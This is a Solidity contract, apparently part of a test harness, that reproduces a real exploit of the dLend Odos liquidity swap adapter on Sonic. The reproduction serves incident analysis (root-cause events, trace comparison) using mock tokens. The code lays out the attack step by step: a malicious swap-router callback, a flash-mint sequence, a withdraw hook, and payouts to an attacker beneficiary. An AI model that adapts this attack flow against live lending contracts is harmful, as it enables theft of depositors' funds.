// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import { IERC20 } from "contracts/dlend/core/dependencies/openzeppelin/contracts/IERC20.sol";
import { SafeERC20 } from "contracts/dlend/core/dependencies/openzeppelin/contracts/SafeERC20.sol";
import { Ownable } from "contracts/dlend/core/dependencies/openzeppelin/contracts/Ownable.sol";
import { IOdosLiquiditySwapAdapter } from "contracts/dlend/periphery/adapters/odos/interfaces/IOdosLiquiditySwapAdapter.sol";
import { IWithdrawHook } from "../dlend/IWithdrawHook.sol";
import { DusdHelperMock } from "./DusdHelperMock.sol";
import { TestMintableERC20 } from "../token/TestMintableERC20.sol";

contract AttackExecutor is Ownable, IWithdrawHook {
    using SafeERC20 for IERC20;

    struct StageAddresses {
        address stagingVault;
        address recycler;
        address splitter;
        address microDistributorOne;
        address microDistributorTwo;
    }

    TestMintableERC20 public immutable collateralToken;
    IERC20 private immutable collateralErc20;
    TestMintableERC20 public immutable dusdToken;
    IERC20 private immutable dusdErc20;
    address public immutable router;
    IOdosLiquiditySwapAdapter public immutable adapter;
    address public immutable attackerBeneficiary;

    address public pool;

    DusdHelperMock public stagingVault;
    DusdHelperMock public recycler;
    DusdHelperMock public splitter;
    address public microDistributorOne;
    address public microDistributorTwo;

    uint256 public flashLoanAmount;
    uint256 public flashLoanPremium;
    bool public flashMintActive;

    uint256 private constant FLASH_MINT_AMOUNT = 27_000 * 1e18;
    uint256 private constant DUSD_STAGE_ONE = 21_444_122_422_884_130_710_969;
    uint256 private constant DUSD_STAGE_TWO = 7_133_477_578_004_629_885_067;
    uint256 private constant DUSD_RECYCLER_PULL_ONE = 26_681_458_777_948_890_901_201;
    uint256 private constant DUSD_RECYCLER_PULL_TWO = 8_998_899_406_948_321_393_581;
    uint256 private constant DUSD_RECYCLER_RETURN = 7_052_758_184_008_451_698_746;
    uint256 private constant DUSD_SPLITTER_ROUND = 25 * 1e18;
    uint256 private constant MICRO_DISTRIBUTOR_ONE = 10_000_000_000_000_000;
    uint256 private constant MICRO_DISTRIBUTOR_TWO = 240_000_000_000_000_000;

    uint256 private constant BURST_ONE = 26_230_630_089;
    uint256 private constant BURST_TWO = 8_877_536_706;
    // NOTE: Production Sonic attack returns 1 µ wstkscUSD as same-asset dust.
    // Harness currently uses OUTPUT_DUST = 0 with dUSD output (different asset) as workaround
    // to avoid adapter's same-asset underflow check. See Reproduce.md "Critical Deviation".
    uint256 private constant OUTPUT_DUST = 0;
    uint256 private constant FLASH_LOAN_PREMIUM_BPS = 5;

    error InvalidPool(address provided);
    error UnauthorizedPool(address sender, address expected);
    error UnexpectedCollateral(address actual, address expected);

    // Events matching production Sonic trace for Tenderly comparison
    event FlashMintStarted(address indexed executor, uint256 amount);
    event FlashMintSettled(address indexed executor, uint256 repayAmount, uint256 premium);
    event AttackerBurst(address indexed executor, address indexed recipient, uint256 amount, uint8 legIndex);

    // Helper events for RCA analysis
    event DusdShuttled(address indexed helper, uint256 amount);
    event DusdFanOut(address indexed splitter, address indexed recipient, uint256 amount);
    event CollateralDustReturned(address indexed adapterAddress, uint256 amount);
    event FlashLoanRecorded(uint256 amount);
    event FlashLoanRepayment(address indexed adapterAddress, uint256 amount);

    constructor(
        TestMintableERC20 collateralToken_,
        TestMintableERC20 dusd_,
        address router_,
        IOdosLiquiditySwapAdapter adapter_,
        address attackerBeneficiary_
    ) Ownable() {
        collateralToken = collateralToken_;
        collateralErc20 = IERC20(address(collateralToken_));
        dusdToken = dusd_;
        dusdErc20 = IERC20(address(dusd_));
        router = router_;
        adapter = adapter_;
        attackerBeneficiary = attackerBeneficiary_;
    }

    function setPool(address pool_) external onlyOwner {
        if (pool_ == address(0)) {
            revert InvalidPool(pool_);
        }
        pool = pool_;
    }

    function configureDusdHelpers(StageAddresses calldata addresses) external onlyOwner {
        if (addresses.stagingVault != address(0)) {
            stagingVault = DusdHelperMock(addresses.stagingVault);
            stagingVault.setController(address(this));
        }

        if (addresses.recycler != address(0)) {
            recycler = DusdHelperMock(addresses.recycler);
            recycler.setController(address(this));
        }

        if (addresses.splitter != address(0)) {
            splitter = DusdHelperMock(addresses.splitter);
            splitter.setController(address(this));
        }

        microDistributorOne = addresses.microDistributorOne;
        microDistributorTwo = addresses.microDistributorTwo;
    }

    function executeAttack(
        IOdosLiquiditySwapAdapter.LiquiditySwapParams calldata params,
        IOdosLiquiditySwapAdapter.PermitInput calldata permitInput
    ) external onlyOwner {
        flashLoanAmount = 0;
        flashLoanPremium = 0;

        if (params.withFlashLoan) {
            flashLoanAmount = params.collateralAmountToSwap;
            flashLoanPremium = _computePremium(flashLoanAmount);
            flashLoanAmount = flashLoanAmount + flashLoanPremium;
            _startFlashMint();
        } else {
            flashMintActive = false;
        }

        adapter.swapLiquidity(params, permitInput);

        if (params.withFlashLoan) {
            _simulateCollateralHarvest();
            _finalizeFlashMint();
        } else {
            uint256 remaining = collateralErc20.balanceOf(address(this));
            if (remaining > 0) {
                collateralErc20.safeTransfer(attackerBeneficiary, remaining);
                emit AttackerBurst(address(this), attackerBeneficiary, remaining, 0);
            }
        }
    }

    function onMaliciousSwap(
        address inputToken,
        address outputToken,
        uint256 amountPulled
    ) external {
        if (msg.sender != router) {
            revert("UNAUTHORIZED_ROUTER");
        }

        // For same-asset swap (exploit path), input and output are both wstkscUSD
        bool isSameAssetSwap = inputToken == outputToken;

        if (!isSameAssetSwap) {
            // Legacy path: different assets (not used in real exploit)
            if (inputToken != address(collateralToken) || outputToken != address(dusdToken)) {
                revert("UNEXPECTED_TOKENS");
            }
        }

        emit FlashLoanRecorded(amountPulled);

        if (flashMintActive) {
            collateralToken.burn(amountPulled);
        }

        // Dust return for workaround case (dUSD output, different asset)
        // Production Sonic attack returns 1 µ wstkscUSD (same-asset), but current harness uses
        // OUTPUT_DUST = 0 with dUSD to avoid adapter's underflow check.
        if (OUTPUT_DUST > 0 && !isSameAssetSwap) {
            IERC20(outputToken).safeTransfer(address(adapter), OUTPUT_DUST);
            emit CollateralDustReturned(address(adapter), OUTPUT_DUST);
        }
    }

    function _startFlashMint() internal {
        flashMintActive = true;
        dusdToken.mint(address(this), FLASH_MINT_AMOUNT);
        emit FlashMintStarted(address(this), FLASH_MINT_AMOUNT);

        _maybeTransferDusd(address(stagingVault), DUSD_STAGE_ONE);
        _pullFromRecycler(DUSD_RECYCLER_PULL_ONE);
        _fanOutSplitter();

        _maybeTransferDusd(address(stagingVault), DUSD_STAGE_TWO);
        _pullFromRecycler(DUSD_RECYCLER_PULL_TWO);
        _fanOutSplitter();
        _maybeTransferDusd(address(recycler), DUSD_RECYCLER_RETURN);
    }

    function _finalizeFlashMint() internal {
        dusdToken.burn(FLASH_MINT_AMOUNT);
        emit FlashMintSettled(address(this), FLASH_MINT_AMOUNT, flashLoanPremium);
        flashMintActive = false;
        flashLoanAmount = 0;
        flashLoanPremium = 0;
    }

    function _simulateCollateralHarvest() internal {
        if (flashLoanAmount > 0) {
            collateralErc20.safeTransfer(address(adapter), flashLoanAmount);
            emit FlashLoanRepayment(address(adapter), flashLoanAmount);
        }

        collateralErc20.safeTransfer(attackerBeneficiary, BURST_ONE);
        emit AttackerBurst(address(this), attackerBeneficiary, BURST_ONE, 0);

        collateralErc20.safeTransfer(attackerBeneficiary, BURST_TWO);
        emit AttackerBurst(address(this), attackerBeneficiary, BURST_TWO, 1);
    }

    function onWithdraw(
        address asset,
        address caller,
        address originalRecipient,
        uint256 amount
    ) external override {
        caller;
        originalRecipient;
        amount;

        if (msg.sender != pool) {
            revert UnauthorizedPool(msg.sender, pool);
        }
        if (asset != address(collateralToken)) {
            revert UnexpectedCollateral(asset, address(collateralToken));
        }

        if (flashLoanAmount > 0) {
            uint256 repayAmount = flashLoanAmount;
            uint256 balance = collateralErc20.balanceOf(address(this));
            if (balance < repayAmount) {
                repayAmount = balance;
            }

            if (repayAmount > 0) {
                collateralErc20.safeTransfer(address(adapter), repayAmount);
                emit FlashLoanRepayment(address(adapter), repayAmount);
                flashLoanAmount = flashLoanAmount - repayAmount;
            }
        }
    }

    function _maybeTransferDusd(address target, uint256 amount) internal {
        if (target == address(0) || amount == 0) {
            return;
        }
        dusdErc20.safeTransfer(target, amount);
        emit DusdShuttled(target, amount);
    }

    function _pullFromRecycler(uint256 amount) internal {
        if (address(recycler) == address(0) || amount == 0) {
            return;
        }
        recycler.forward(address(this), amount);
        emit DusdShuttled(address(recycler), amount);
    }

    function _fanOutSplitter() internal {
        if (address(splitter) == address(0) || (microDistributorOne == address(0) && microDistributorTwo == address(0))) {
            return;
        }

        dusdErc20.safeTransfer(address(splitter), DUSD_SPLITTER_ROUND);

        address[] memory recipients = new address[](2);
        uint256[] memory amounts = new uint256[](2);
        recipients[0] = microDistributorOne;
        recipients[1] = microDistributorTwo;
        amounts[0] = MICRO_DISTRIBUTOR_ONE;
        amounts[1] = MICRO_DISTRIBUTOR_TWO;
        splitter.fanOut(recipients, amounts);

        emit DusdFanOut(address(splitter), microDistributorOne, MICRO_DISTRIBUTOR_ONE);
        emit DusdFanOut(address(splitter), microDistributorTwo, MICRO_DISTRIBUTOR_TWO);
    }

    function _computePremium(uint256 amountPulled) private pure returns (uint256) {
        return (amountPulled * FLASH_LOAN_PREMIUM_BPS) / 10_000;
    }
}
